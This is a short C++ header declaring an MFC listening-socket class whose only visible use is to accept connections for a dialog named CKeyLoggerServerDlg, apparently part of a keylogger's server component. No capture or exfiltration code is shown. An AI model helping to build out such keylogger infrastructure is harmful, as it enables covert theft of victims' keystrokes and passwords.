#pragma once
#include <afxsock.h>

class CKeyLoggerServerDlg;
class CListenSocket :
	public CSocket
{

public:
	CListenSocket(CKeyLoggerServerDlg*);
	virtual void OnAccept(int nErrorCode);
	CKeyLoggerServerDlg* m_mainDlg;
};

